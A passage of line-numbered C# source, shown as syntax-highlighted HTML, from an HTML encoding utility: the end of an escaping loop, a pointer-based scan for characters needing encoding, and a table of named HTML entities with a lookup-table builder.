<code class="lineno">187 </code>                           <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="s">"&amp;gt;"</code><code class="p">);</code>
<code class="lineno">188 </code>                           <code class="n">numberOfEscapes</code><code class="p">++;</code>
<code class="lineno">189 </code>                           <code class="k">continue</code><code class="p">;</code>
<code class="lineno">190 </code>                        <code class="k">case</code> <code class="sc">'/'</code><code class="p">:</code>
<code class="lineno">191 </code>                           <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="s">"&amp;amp;#x2F;"</code><code class="p">);</code>
<code class="lineno">192 </code>                           <code class="n">numberOfEscapes</code> <code class="p">=</code> <code class="n">numberOfEscapes</code> <code class="p">+</code> <code class="m">2</code><code class="p">;</code>
<code class="lineno">193 </code>                           <code class="k">continue</code><code class="p">;</code>
<code class="lineno">194 </code>                        <code class="k">default</code><code class="p">:</code>
<code class="lineno">195 </code>                           <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="n">ch</code><code class="p">);</code>
<code class="lineno">196 </code>                           <code class="k">continue</code><code class="p">;</code>
<code class="lineno">197 </code>                     <code class="p">}</code>
<code class="lineno">198 </code>                  <code class="p">}</code>
<code class="lineno">199 </code>                  <code class="k">if</code> <code class="p">(</code><code class="n">ch</code> <code class="p">&gt;=</code> <code class="m">160</code> <code class="p">&amp;&amp;</code> <code class="n">ch</code> <code class="p">&lt;</code> <code class="m">256</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">200 </code>                     <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="s">"&amp;#"</code><code class="p">);</code>
<code class="lineno">201 </code>                     <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(((</code><code class="kt">int</code><code class="p">)</code><code class="n">ch</code><code class="p">).</code><code class="n">ToString</code><code class="p">(</code><code class="n">NumberFormatInfo</code><code class="p">.</code><code class="n">InvariantInfo</code><code class="p">));</code>
<code class="lineno">202 </code>                     <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="sc">';'</code><code class="p">);</code>
<code class="lineno">203 </code>                     <code class="n">numberOfEscapes</code><code class="p">++;</code>
<code class="lineno">204 </code>                  <code class="p">}</code>
<code class="lineno">205 </code>                  <code class="k">else</code>
<code class="lineno">206 </code>                     <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="n">ch</code><code class="p">);</code>
<code class="lineno">207 </code>               <code class="p">}</code>
<code class="lineno">208 </code>            <code class="p">}</code>
<code class="lineno">209 </code>         <code class="p">}</code>
<code class="lineno">210 </code>         <code class="kt">string</code> <code class="n">encodedHtml</code> <code class="p">=</code> <code class="n">output</code><code class="p">.</code><code class="n">ToString</code><code class="p">();</code>
<code class="lineno">211 </code>         <code class="n">output</code><code class="p">.</code><code class="n">Dispose</code><code class="p">();</code>
<code class="lineno">212 </code>         <code class="k">return</code> <code class="n">encodedHtml</code><code class="p">;</code>
<code class="lineno">213 </code>      <code class="p">}</code>
<code class="lineno">214 </code>
<code class="lineno">215 </code>      <code class="k">private</code> <code class="k">static</code> <code class="k">unsafe</code> <code class="kt">int</code> <code class="nf">IndexOfHtmlEncodingChars</code><code class="p">(</code><code class="kt">string</code> <code class="n">searchString</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">216 </code>         <code class="kt">int</code> <code class="n">num</code> <code class="p">=</code> <code class="n">searchString</code><code class="p">.</code><code class="n">Length</code><code class="p">;</code>
<code class="lineno">217 </code>         <code class="k">fixed</code> <code class="p">(</code><code class="kt">char</code><code class="p">*</code> <code class="n">chPtr1</code> <code class="p">=</code> <code class="n">searchString</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">218 </code>            <code class="kt">char</code><code class="p">*</code> <code class="n">chPtr2</code> <code class="p">=</code> <code class="p">(</code><code class="kt">char</code><code class="p">*)((</code><code class="n">UIntPtr</code><code class="p">)</code><code class="n">chPtr1</code><code class="p">);</code>
<code class="lineno">219 </code>            <code class="k">for</code> <code class="p">(;</code> <code class="n">num</code> <code class="p">&gt;</code> <code class="m">0</code><code class="p">;</code> <code class="p">--</code><code class="n">num</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">220 </code>               <code class="kt">char</code> <code class="n">ch</code> <code class="p">=</code> <code class="p">*</code><code class="n">chPtr2</code><code class="p">;</code>
<code class="lineno">221 </code>               <code class="k">if</code> <code class="p">(</code><code class="n">ch</code> <code class="p">&lt;=</code> <code class="m">62</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">222 </code>                  <code class="k">switch</code> <code class="p">(</code><code class="n">ch</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">223 </code>                     <code class="k">case</code> <code class="sc">'"'</code><code class="p">:</code>
<code class="lineno">224 </code>                     <code class="k">case</code> <code class="sc">'&amp;'</code><code class="p">:</code>
<code class="lineno">225 </code>                     <code class="k">case</code> <code class="sc">'\''</code><code class="p">:</code>
<code class="lineno">226 </code>                     <code class="k">case</code> <code class="sc">'&lt;'</code><code class="p">:</code>
<code class="lineno">227 </code>                     <code class="k">case</code> <code class="sc">'&gt;'</code><code class="p">:</code>
<code class="lineno">228 </code>                     <code class="k">case</code> <code class="sc">'/'</code><code class="p">:</code>
<code class="lineno">229 </code>                        <code class="k">return</code> <code class="n">searchString</code><code class="p">.</code><code class="n">Length</code> <code class="p">-</code> <code class="n">num</code><code class="p">;</code>
<code class="lineno">230 </code>                  <code class="p">}</code>
<code class="lineno">231 </code>               <code class="p">}</code>
<code class="lineno">232 </code>               <code class="k">else</code> <code class="nf">if</code> <code class="p">(</code><code class="n">ch</code> <code class="p">&gt;=</code> <code class="m">160</code> <code class="p">&amp;&amp;</code> <code class="n">ch</code> <code class="p">&lt;</code> <code class="m">256</code><code class="p">)</code>
<code class="lineno">233 </code>                  <code class="k">return</code> <code class="n">searchString</code><code class="p">.</code><code class="n">Length</code> <code class="p">-</code> <code class="n">num</code><code class="p">;</code>
<code class="lineno">234 </code>               <code class="p">++</code><code class="n">chPtr2</code><code class="p">;</code>
<code class="lineno">235 </code>            <code class="p">}</code>
<code class="lineno">236 </code>         <code class="p">}</code>
<code class="lineno">237 </code>         <code class="k">return</code> <code class="n">CharacterIndexNotFound</code><code class="p">;</code>
<code class="lineno">238 </code>      <code class="p">}</code>
<code class="lineno">239 </code>      
<code class="lineno">240 </code>      <code class="k">private</code> <code class="k">static</code> <code class="kt">char</code><code class="p">[]</code> <code class="n">_htmlEntityEndingChars</code> <code class="p">=</code> <code class="k">new</code> <code class="kt">char</code><code class="p">[</code><code class="m">2</code><code class="p">]</code> <code class="p">{</code>
<code class="lineno">241 </code>         <code class="sc">';'</code><code class="p">,</code>
<code class="lineno">242 </code>         <code class="sc">'&amp;'</code>
<code class="lineno">243 </code>      <code class="p">};</code>
<code class="lineno">244 </code>
<code class="lineno">245 </code>      <code class="k">private</code> <code class="k">static</code> <code class="k">class</code> <code class="nc">HtmlEntities</code> <code class="p">{</code>
<code class="lineno">246 </code>         <code class="k">private</code> <code class="k">static</code> <code class="kt">string</code><code class="p">[]</code> <code class="n">_entitiesList</code> <code class="p">=</code> <code class="k">new</code> <code class="kt">string</code><code class="p">[</code><code class="m">253</code><code class="p">]</code> <code class="p">{</code>
<code class="lineno">247 </code>            <code class="s">"\"-quot"</code><code class="p">,</code>
<code class="lineno">248 </code>            <code class="s">"&amp;-amp"</code><code class="p">,</code>
<code class="lineno">249 </code>            <code class="s">"'-apos"</code><code class="p">,</code>
<code class="lineno">250 </code>            <code class="s">"&lt;-lt"</code><code class="p">,</code>
<code class="lineno">251 </code>            <code class="s">"&gt;-gt"</code><code class="p">,</code>
<code class="lineno">252 </code>            <code class="s">" -nbsp"</code><code class="p">,</code>
<code class="lineno">253 </code>            <code class="s">"¡-iexcl"</code><code class="p">,</code>
<code class="lineno">254 </code>            <code class="s">"¢-cent"</code><code class="p">,</code>
<code class="lineno">255 </code>            <code class="s">"£-pound"</code><code class="p">,</code>
<code class="lineno">256 </code>            <code class="s">"¤-curren"</code><code class="p">,</code>
<code class="lineno">257 </code>            <code class="s">"¥-yen"</code><code class="p">,</code>
<code class="lineno">258 </code>            <code class="s">"¦-brvbar"</code><code class="p">,</code>
<code class="lineno">259 </code>            <code class="s">"§-sect"</code><code class="p">,</code>
<code class="lineno">260 </code>            <code class="s">"¨-uml"</code><code class="p">,</code>
<code class="lineno">261 </code>            <code class="s">"©-copy"</code><code class="p">,</code>
<code class="lineno">262 </code>            <code class="s">"ª-ordf"</code><code class="p">,</code>
<code class="lineno">263 </code>            <code class="s">"«-laquo"</code><code class="p">,</code>
<code class="lineno">264 </code>            <code class="s">"¬-not"</code><code class="p">,</code>
<code class="lineno">265 </code>            <code class="s">"\x00AD-shy"</code><code class="p">,</code>
<code class="lineno">266 </code>            <code class="s">"®-reg"</code><code class="p">,</code>
<code class="lineno">267 </code>            <code class="s">"¯-macr"</code><code class="p">,</code>
<code class="lineno">268 </code>            <code class="s">"°-deg"</code><code class="p">,</code>
<code class="lineno">269 </code>            <code class="s">"±-plusmn"</code><code class="p">,</code>
<code class="lineno">270 </code>            <code class="s">"\x00B2-sup2"</code><code class="p">,</code>
<code class="lineno">271 </code>            <code class="s">"\x00B3-sup3"</code><code class="p">,</code>
<code class="lineno">272 </code>            <code class="s">"´-acute"</code><code class="p">,</code>
<code class="lineno">273 </code>            <code class="s">"µ-micro"</code><code class="p">,</code>
<code class="lineno">274 </code>            <code class="s">"¶-para"</code><code class="p">,</code>
<code class="lineno">275 </code>            <code class="s">"·-middot"</code><code class="p">,</code>
<code class="lineno">276 </code>            <code class="s">"¸-cedil"</code><code class="p">,</code>
<code class="lineno">277 </code>            <code class="s">"\x00B9-sup1"</code><code class="p">,</code>
<code class="lineno">278 </code>            <code class="s">"º-ordm"</code><code class="p">,</code>
<code class="lineno">279 </code>            <code class="s">"»-raquo"</code><code class="p">,</code>
<code class="lineno">280 </code>            <code class="s">"\x00BC-frac14"</code><code class="p">,</code>
<code class="lineno">281 </code>            <code class="s">"\x00BD-frac12"</code><code class="p">,</code>
<code class="lineno">282 </code>            <code class="s">"\x00BE-frac34"</code><code class="p">,</code>
<code class="lineno">283 </code>            <code class="s">"¿-iquest"</code><code class="p">,</code>
<code class="lineno">284 </code>            <code class="s">"À-Agrave"</code><code class="p">,</code>
<code class="lineno">285 </code>            <code class="s">"Á-Aacute"</code><code class="p">,</code>
<code class="lineno">286 </code>            <code class="s">"Â-Acirc"</code><code class="p">,</code>
<code class="lineno">287 </code>            <code class="s">"Ã-Atilde"</code><code class="p">,</code>
<code class="lineno">288 </code>            <code class="s">"Ä-Auml"</code><code class="p">,</code>
<code class="lineno">289 </code>            <code class="s">"Å-Aring"</code><code class="p">,</code>
<code class="lineno">290 </code>            <code class="s">"Æ-AElig"</code><code class="p">,</code>
<code class="lineno">291 </code>            <code class="s">"Ç-Ccedil"</code><code class="p">,</code>
<code class="lineno">292 </code>            <code class="s">"È-Egrave"</code><code class="p">,</code>
<code class="lineno">293 </code>            <code class="s">"É-Eacute"</code><code class="p">,</code>
<code class="lineno">294 </code>            <code class="s">"Ê-Ecirc"</code><code class="p">,</code>
<code class="lineno">295 </code>            <code class="s">"Ë-Euml"</code><code class="p">,</code>
<code class="lineno">296 </code>            <code class="s">"Ì-Igrave"</code><code class="p">,</code>
<code class="lineno">297 </code>            <code class="s">"Í-Iacute"</code><code class="p">,</code>
<code class="lineno">298 </code>            <code class="s">"Î-Icirc"</code><code class="p">,</code>
<code class="lineno">299 </code>            <code class="s">"Ï-Iuml"</code><code class="p">,</code>
<code class="lineno">300 </code>            <code class="s">"Ð-ETH"</code><code class="p">,</code>
<code class="lineno">301 </code>            <code class="s">"Ñ-Ntilde"</code><code class="p">,</code>
<code class="lineno">302 </code>            <code class="s">"Ò-Ograve"</code><code class="p">,</code>
<code class="lineno">303 </code>            <code class="s">"Ó-Oacute"</code><code class="p">,</code>
<code class="lineno">304 </code>            <code class="s">"Ô-Ocirc"</code><code class="p">,</code>
<code class="lineno">305 </code>            <code class="s">"Õ-Otilde"</code><code class="p">,</code>
<code class="lineno">306 </code>            <code class="s">"Ö-Ouml"</code><code class="p">,</code>
<code class="lineno">307 </code>            <code class="s">"×-times"</code><code class="p">,</code>
<code class="lineno">308 </code>            <code class="s">"Ø-Oslash"</code><code class="p">,</code>
<code class="lineno">309 </code>            <code class="s">"Ù-Ugrave"</code><code class="p">,</code>
<code class="lineno">310 </code>            <code class="s">"Ú-Uacute"</code><code class="p">,</code>
<code class="lineno">311 </code>            <code class="s">"Û-Ucirc"</code><code class="p">,</code>
<code class="lineno">312 </code>            <code class="s">"Ü-Uuml"</code><code class="p">,</code>
<code class="lineno">313 </code>            <code class="s">"Ý-Yacute"</code><code class="p">,</code>
<code class="lineno">314 </code>            <code class="s">"Þ-THORN"</code><code class="p">,</code>
<code class="lineno">315 </code>            <code class="s">"ß-szlig"</code><code class="p">,</code>
<code class="lineno">316 </code>            <code class="s">"à-agrave"</code><code class="p">,</code>
<code class="lineno">317 </code>            <code class="s">"á-aacute"</code><code class="p">,</code>
<code class="lineno">318 </code>            <code class="s">"â-acirc"</code><code class="p">,</code>
<code class="lineno">319 </code>            <code class="s">"ã-atilde"</code><code class="p">,</code>
<code class="lineno">320 </code>            <code class="s">"ä-auml"</code><code class="p">,</code>
<code class="lineno">321 </code>            <code class="s">"å-aring"</code><code class="p">,</code>
<code class="lineno">322 </code>            <code class="s">"æ-aelig"</code><code class="p">,</code>
<code class="lineno">323 </code>            <code class="s">"ç-ccedil"</code><code class="p">,</code>
<code class="lineno">324 </code>            <code class="s">"è-egrave"</code><code class="p">,</code>
<code class="lineno">325 </code>            <code class="s">"é-eacute"</code><code class="p">,</code>
<code class="lineno">326 </code>            <code class="s">"ê-ecirc"</code><code class="p">,</code>
<code class="lineno">327 </code>            <code class="s">"ë-euml"</code><code class="p">,</code>
<code class="lineno">328 </code>            <code class="s">"ì-igrave"</code><code class="p">,</code>
<code class="lineno">329 </code>            <code class="s">"í-iacute"</code><code class="p">,</code>
<code class="lineno">330 </code>            <code class="s">"î-icirc"</code><code class="p">,</code>
<code class="lineno">331 </code>            <code class="s">"ï-iuml"</code><code class="p">,</code>
<code class="lineno">332 </code>            <code class="s">"ð-eth"</code><code class="p">,</code>
<code class="lineno">333 </code>            <code class="s">"ñ-ntilde"</code><code class="p">,</code>
<code class="lineno">334 </code>            <code class="s">"ò-ograve"</code><code class="p">,</code>
<code class="lineno">335 </code>            <code class="s">"ó-oacute"</code><code class="p">,</code>
<code class="lineno">336 </code>            <code class="s">"ô-ocirc"</code><code class="p">,</code>
<code class="lineno">337 </code>            <code class="s">"õ-otilde"</code><code class="p">,</code>
<code class="lineno">338 </code>            <code class="s">"ö-ouml"</code><code class="p">,</code>
<code class="lineno">339 </code>            <code class="s">"÷-divide"</code><code class="p">,</code>
<code class="lineno">340 </code>            <code class="s">"ø-oslash"</code><code class="p">,</code>
<code class="lineno">341 </code>            <code class="s">"ù-ugrave"</code><code class="p">,</code>
<code class="lineno">342 </code>            <code class="s">"ú-uacute"</code><code class="p">,</code>
<code class="lineno">343 </code>            <code class="s">"û-ucirc"</code><code class="p">,</code>
<code class="lineno">344 </code>            <code class="s">"ü-uuml"</code><code class="p">,</code>
<code class="lineno">345 </code>            <code class="s">"ý-yacute"</code><code class="p">,</code>
<code class="lineno">346 </code>            <code class="s">"þ-thorn"</code><code class="p">,</code>
<code class="lineno">347 </code>            <code class="s">"ÿ-yuml"</code><code class="p">,</code>
<code class="lineno">348 </code>            <code class="s">"Œ-OElig"</code><code class="p">,</code>
<code class="lineno">349 </code>            <code class="s">"œ-oelig"</code><code class="p">,</code>
<code class="lineno">350 </code>            <code class="s">"Š-Scaron"</code><code class="p">,</code>
<code class="lineno">351 </code>            <code class="s">"š-scaron"</code><code class="p">,</code>
<code class="lineno">352 </code>            <code class="s">"Ÿ-Yuml"</code><code class="p">,</code>
<code class="lineno">353 </code>            <code class="s">"ƒ-fnof"</code><code class="p">,</code>
<code class="lineno">354 </code>            <code class="s">"\x02C6-circ"</code><code class="p">,</code>
<code class="lineno">355 </code>            <code class="s">"˜-tilde"</code><code class="p">,</code>
<code class="lineno">356 </code>            <code class="s">"Α-Alpha"</code><code class="p">,</code>
<code class="lineno">357 </code>            <code class="s">"Β-Beta"</code><code class="p">,</code>
<code class="lineno">358 </code>            <code class="s">"Γ-Gamma"</code><code class="p">,</code>
<code class="lineno">359 </code>            <code class="s">"Δ-Delta"</code><code class="p">,</code>
<code class="lineno">360 </code>            <code class="s">"Ε-Epsilon"</code><code class="p">,</code>
<code class="lineno">361 </code>            <code class="s">"Ζ-Zeta"</code><code class="p">,</code>
<code class="lineno">362 </code>            <code class="s">"Η-Eta"</code><code class="p">,</code>
<code class="lineno">363 </code>            <code class="s">"Θ-Theta"</code><code class="p">,</code>
<code class="lineno">364 </code>            <code class="s">"Ι-Iota"</code><code class="p">,</code>
<code class="lineno">365 </code>            <code class="s">"Κ-Kappa"</code><code class="p">,</code>
<code class="lineno">366 </code>            <code class="s">"Λ-Lambda"</code><code class="p">,</code>
<code class="lineno">367 </code>            <code class="s">"Μ-Mu"</code><code class="p">,</code>
<code class="lineno">368 </code>            <code class="s">"Ν-Nu"</code><code class="p">,</code>
<code class="lineno">369 </code>            <code class="s">"Ξ-Xi"</code><code class="p">,</code>
<code class="lineno">370 </code>            <code class="s">"Ο-Omicron"</code><code class="p">,</code>
<code class="lineno">371 </code>            <code class="s">"Π-Pi"</code><code class="p">,</code>
<code class="lineno">372 </code>            <code class="s">"Ρ-Rho"</code><code class="p">,</code>
<code class="lineno">373 </code>            <code class="s">"Σ-Sigma"</code><code class="p">,</code>
<code class="lineno">374 </code>            <code class="s">"Τ-Tau"</code><code class="p">,</code>
<code class="lineno">375 </code>            <code class="s">"Υ-Upsilon"</code><code class="p">,</code>
<code class="lineno">376 </code>            <code class="s">"Φ-Phi"</code><code class="p">,</code>
<code class="lineno">377 </code>            <code class="s">"Χ-Chi"</code><code class="p">,</code>
<code class="lineno">378 </code>            <code class="s">"Ψ-Psi"</code><code class="p">,</code>
<code class="lineno">379 </code>            <code class="s">"Ω-Omega"</code><code class="p">,</code>
<code class="lineno">380 </code>            <code class="s">"α-alpha"</code><code class="p">,</code>
<code class="lineno">381 </code>            <code class="s">"β-beta"</code><code class="p">,</code>
<code class="lineno">382 </code>            <code class="s">"γ-gamma"</code><code class="p">,</code>
<code class="lineno">383 </code>            <code class="s">"δ-delta"</code><code class="p">,</code>
<code class="lineno">384 </code>            <code class="s">"ε-epsilon"</code><code class="p">,</code>
<code class="lineno">385 </code>            <code class="s">"ζ-zeta"</code><code class="p">,</code>
<code class="lineno">386 </code>            <code class="s">"η-eta"</code><code class="p">,</code>
<code class="lineno">387 </code>            <code class="s">"θ-theta"</code><code class="p">,</code>
<code class="lineno">388 </code>            <code class="s">"ι-iota"</code><code class="p">,</code>
<code class="lineno">389 </code>            <code class="s">"κ-kappa"</code><code class="p">,</code>
<code class="lineno">390 </code>            <code class="s">"λ-lambda"</code><code class="p">,</code>
<code class="lineno">391 </code>            <code class="s">"μ-mu"</code><code class="p">,</code>
<code class="lineno">392 </code>            <code class="s">"ν-nu"</code><code class="p">,</code>
<code class="lineno">393 </code>            <code class="s">"ξ-xi"</code><code class="p">,</code>
<code class="lineno">394 </code>            <code class="s">"ο-omicron"</code><code class="p">,</code>
<code class="lineno">395 </code>            <code class="s">"π-pi"</code><code class="p">,</code>
<code class="lineno">396 </code>            <code class="s">"ρ-rho"</code><code class="p">,</code>
<code class="lineno">397 </code>            <code class="s">"ς-sigmaf"</code><code class="p">,</code>
<code class="lineno">398 </code>            <code class="s">"σ-sigma"</code><code class="p">,</code>
<code class="lineno">399 </code>            <code class="s">"τ-tau"</code><code class="p">,</code>
<code class="lineno">400 </code>            <code class="s">"υ-upsilon"</code><code class="p">,</code>
<code class="lineno">401 </code>            <code class="s">"φ-phi"</code><code class="p">,</code>
<code class="lineno">402 </code>            <code class="s">"χ-chi"</code><code class="p">,</code>
<code class="lineno">403 </code>            <code class="s">"ψ-psi"</code><code class="p">,</code>
<code class="lineno">404 </code>            <code class="s">"ω-omega"</code><code class="p">,</code>
<code class="lineno">405 </code>            <code class="s">"ϑ-thetasym"</code><code class="p">,</code>
<code class="lineno">406 </code>            <code class="s">"ϒ-upsih"</code><code class="p">,</code>
<code class="lineno">407 </code>            <code class="s">"ϖ-piv"</code><code class="p">,</code>
<code class="lineno">408 </code>            <code class="s">" -ensp"</code><code class="p">,</code>
<code class="lineno">409 </code>            <code class="s">" -emsp"</code><code class="p">,</code>
<code class="lineno">410 </code>            <code class="s">" -thinsp"</code><code class="p">,</code>
<code class="lineno">411 </code>            <code class="s">"\x200C-zwnj"</code><code class="p">,</code>
<code class="lineno">412 </code>            <code class="s">"\x200D-zwj"</code><code class="p">,</code>
<code class="lineno">413 </code>            <code class="s">"\x200E-lrm"</code><code class="p">,</code>
<code class="lineno">414 </code>            <code class="s">"\x200F-rlm"</code><code class="p">,</code>
<code class="lineno">415 </code>            <code class="s">"–-ndash"</code><code class="p">,</code>
<code class="lineno">416 </code>            <code class="s">"—-mdash"</code><code class="p">,</code>
<code class="lineno">417 </code>            <code class="s">"‘-lsquo"</code><code class="p">,</code>
<code class="lineno">418 </code>            <code class="s">"’-rsquo"</code><code class="p">,</code>
<code class="lineno">419 </code>            <code class="s">"‚-sbquo"</code><code class="p">,</code>
<code class="lineno">420 </code>            <code class="s">"“-ldquo"</code><code class="p">,</code>
<code class="lineno">421 </code>            <code class="s">"”-rdquo"</code><code class="p">,</code>
<code class="lineno">422 </code>            <code class="s">"„-bdquo"</code><code class="p">,</code>
<code class="lineno">423 </code>            <code class="s">"†-dagger"</code><code class="p">,</code>
<code class="lineno">424 </code>            <code class="s">"‡-Dagger"</code><code class="p">,</code>
<code class="lineno">425 </code>            <code class="s">"•-bull"</code><code class="p">,</code>
<code class="lineno">426 </code>            <code class="s">"…-hellip"</code><code class="p">,</code>
<code class="lineno">427 </code>            <code class="s">"‰-permil"</code><code class="p">,</code>
<code class="lineno">428 </code>            <code class="s">"′-prime"</code><code class="p">,</code>
<code class="lineno">429 </code>            <code class="s">"″-Prime"</code><code class="p">,</code>
<code class="lineno">430 </code>            <code class="s">"‹-lsaquo"</code><code class="p">,</code>
<code class="lineno">431 </code>            <code class="s">"›-rsaquo"</code><code class="p">,</code>
<code class="lineno">432 </code>            <code class="s">"‾-oline"</code><code class="p">,</code>
<code class="lineno">433 </code>            <code class="s">"⁄-frasl"</code><code class="p">,</code>
<code class="lineno">434 </code>            <code class="s">"€-euro"</code><code class="p">,</code>
<code class="lineno">435 </code>            <code class="s">"ℑ-image"</code><code class="p">,</code>
<code class="lineno">436 </code>            <code class="s">"℘-weierp"</code><code class="p">,</code>
<code class="lineno">437 </code>            <code class="s">"ℜ-real"</code><code class="p">,</code>
<code class="lineno">438 </code>            <code class="s">"™-trade"</code><code class="p">,</code>
<code class="lineno">439 </code>            <code class="s">"ℵ-alefsym"</code><code class="p">,</code>
<code class="lineno">440 </code>            <code class="s">"←-larr"</code><code class="p">,</code>
<code class="lineno">441 </code>            <code class="s">"↑-uarr"</code><code class="p">,</code>
<code class="lineno">442 </code>            <code class="s">"→-rarr"</code><code class="p">,</code>
<code class="lineno">443 </code>            <code class="s">"↓-darr"</code><code class="p">,</code>
<code class="lineno">444 </code>            <code class="s">"↔-harr"</code><code class="p">,</code>
<code class="lineno">445 </code>            <code class="s">"↵-crarr"</code><code class="p">,</code>
<code class="lineno">446 </code>            <code class="s">"⇐-lArr"</code><code class="p">,</code>
<code class="lineno">447 </code>            <code class="s">"⇑-uArr"</code><code class="p">,</code>
<code class="lineno">448 </code>            <code class="s">"⇒-rArr"</code><code class="p">,</code>
<code class="lineno">449 </code>            <code class="s">"⇓-dArr"</code><code class="p">,</code>
<code class="lineno">450 </code>            <code class="s">"⇔-hArr"</code><code class="p">,</code>
<code class="lineno">451 </code>            <code class="s">"∀-forall"</code><code class="p">,</code>
<code class="lineno">452 </code>            <code class="s">"∂-part"</code><code class="p">,</code>
<code class="lineno">453 </code>            <code class="s">"∃-exist"</code><code class="p">,</code>
<code class="lineno">454 </code>            <code class="s">"∅-empty"</code><code class="p">,</code>
<code class="lineno">455 </code>            <code class="s">"∇-nabla"</code><code class="p">,</code>
<code class="lineno">456 </code>            <code class="s">"∈-isin"</code><code class="p">,</code>
<code class="lineno">457 </code>            <code class="s">"∉-notin"</code><code class="p">,</code>
<code class="lineno">458 </code>            <code class="s">"∋-ni"</code><code class="p">,</code>
<code class="lineno">459 </code>            <code class="s">"∏-prod"</code><code class="p">,</code>
<code class="lineno">460 </code>            <code class="s">"∑-sum"</code><code class="p">,</code>
<code class="lineno">461 </code>            <code class="s">"−-minus"</code><code class="p">,</code>
<code class="lineno">462 </code>            <code class="s">"∗-lowast"</code><code class="p">,</code>
<code class="lineno">463 </code>            <code class="s">"√-radic"</code><code class="p">,</code>
<code class="lineno">464 </code>            <code class="s">"∝-prop"</code><code class="p">,</code>
<code class="lineno">465 </code>            <code class="s">"∞-infin"</code><code class="p">,</code>
<code class="lineno">466 </code>            <code class="s">"∠-ang"</code><code class="p">,</code>
<code class="lineno">467 </code>            <code class="s">"∧-and"</code><code class="p">,</code>
<code class="lineno">468 </code>            <code class="s">"∨-or"</code><code class="p">,</code>
<code class="lineno">469 </code>            <code class="s">"∩-cap"</code><code class="p">,</code>
<code class="lineno">470 </code>            <code class="s">"∪-cup"</code><code class="p">,</code>
<code class="lineno">471 </code>            <code class="s">"∫-int"</code><code class="p">,</code>
<code class="lineno">472 </code>            <code class="s">"∴-there4"</code><code class="p">,</code>
<code class="lineno">473 </code>            <code class="s">"∼-sim"</code><code class="p">,</code>
<code class="lineno">474 </code>            <code class="s">"≅-cong"</code><code class="p">,</code>
<code class="lineno">475 </code>            <code class="s">"≈-asymp"</code><code class="p">,</code>
<code class="lineno">476 </code>            <code class="s">"≠-ne"</code><code class="p">,</code>
<code class="lineno">477 </code>            <code class="s">"≡-equiv"</code><code class="p">,</code>
<code class="lineno">478 </code>            <code class="s">"≤-le"</code><code class="p">,</code>
<code class="lineno">479 </code>            <code class="s">"≥-ge"</code><code class="p">,</code>
<code class="lineno">480 </code>            <code class="s">"⊂-sub"</code><code class="p">,</code>
<code class="lineno">481 </code>            <code class="s">"⊃-sup"</code><code class="p">,</code>
<code class="lineno">482 </code>            <code class="s">"⊄-nsub"</code><code class="p">,</code>
<code class="lineno">483 </code>            <code class="s">"⊆-sube"</code><code class="p">,</code>
<code class="lineno">484 </code>            <code class="s">"⊇-supe"</code><code class="p">,</code>
<code class="lineno">485 </code>            <code class="s">"⊕-oplus"</code><code class="p">,</code>
<code class="lineno">486 </code>            <code class="s">"⊗-otimes"</code><code class="p">,</code>
<code class="lineno">487 </code>            <code class="s">"⊥-perp"</code><code class="p">,</code>
<code class="lineno">488 </code>            <code class="s">"⋅-sdot"</code><code class="p">,</code>
<code class="lineno">489 </code>            <code class="s">"⌈-lceil"</code><code class="p">,</code>
<code class="lineno">490 </code>            <code class="s">"⌉-rceil"</code><code class="p">,</code>
<code class="lineno">491 </code>            <code class="s">"⌊-lfloor"</code><code class="p">,</code>
<code class="lineno">492 </code>            <code class="s">"⌋-rfloor"</code><code class="p">,</code>
<code class="lineno">493 </code>            <code class="s">"〈-lang"</code><code class="p">,</code>
<code class="lineno">494 </code>            <code class="s">"〉-rang"</code><code class="p">,</code>
<code class="lineno">495 </code>            <code class="s">"◊-loz"</code><code class="p">,</code>
<code class="lineno">496 </code>            <code class="s">"♠-spades"</code><code class="p">,</code>
<code class="lineno">497 </code>            <code class="s">"♣-clubs"</code><code class="p">,</code>
<code class="lineno">498 </code>            <code class="s">"♥-hearts"</code><code class="p">,</code>
<code class="lineno">499 </code>            <code class="s">"♦-diams"</code>
<code class="lineno">500 </code>         <code class="p">};</code>    
<code class="lineno">501 </code>
<code class="lineno">502 </code>         <code class="k">private</code> <code class="k">static</code> <code class="n">Dictionary</code><code class="p">&lt;</code><code class="kt">string</code><code class="p">,</code> <code class="kt">char</code><code class="p">&gt;</code> <code class="n">_lookupTable</code> <code class="p">=</code> <code class="n">GenerateLookupTable</code><code class="p">();</code>    
<code class="lineno">503 </code>
<code class="lineno">504 </code>         <code class="k">private</code> <code class="k">static</code> <code class="n">Dictionary</code><code class="p">&lt;</code><code class="kt">string</code><code class="p">,</code> <code class="kt">char</code><code class="p">&gt;</code> <code class="n">GenerateLookupTable</code><code class="p">()</code> <code class="p">{</code>
<code class="lineno">505 </code>            <code class="n">Dictionary</code><code class="p">&lt;</code><code class="kt">string</code><code class="p">,</code> <code class="kt">char</code><code class="p">&gt;</code> <code class="n">dictionary</code> <code class="p">=</code>
<code class="lineno">506 </code>               <code class="k">new</code> <code class="n">Dictionary</code><code class="p">&lt;</code><code class="kt">string</code><code class="p">,</code> <code class="kt">char</code><code class="p">&gt;(</code><code class="n">StringComparer</code><code class="p">.</code><code class="n">Ordinal</code><code class="p">);</code>
<code class="lineno">507 </code>            <code class="k">foreach</code> <code class="p">(</code><code class="kt">string</code> <code class="n">str</code> <code class="k">in</code> <code class="n">_entitiesList</code><code class="p">)</code>
<code class="lineno">508 </code>               <code class="n">dictionary</code><code class="p">.</code><code class="n">Add</code><code class="p">(</code><code class="n">str</code><code class="p">.</code><code class="n">Substring</code><code class="p">(</code><code class="m">2</code><code class="p">),</code> <code class="n">str</code><code class="p">[</code><code class="m">0</code><code class="p">]);</code>
<code class="lineno">509 </code>            <code class="k">return</code> <code class="n">dictionary</code><code class="p">;</code>
<code class="lineno">510 </code>         <code class="p">}</code>    
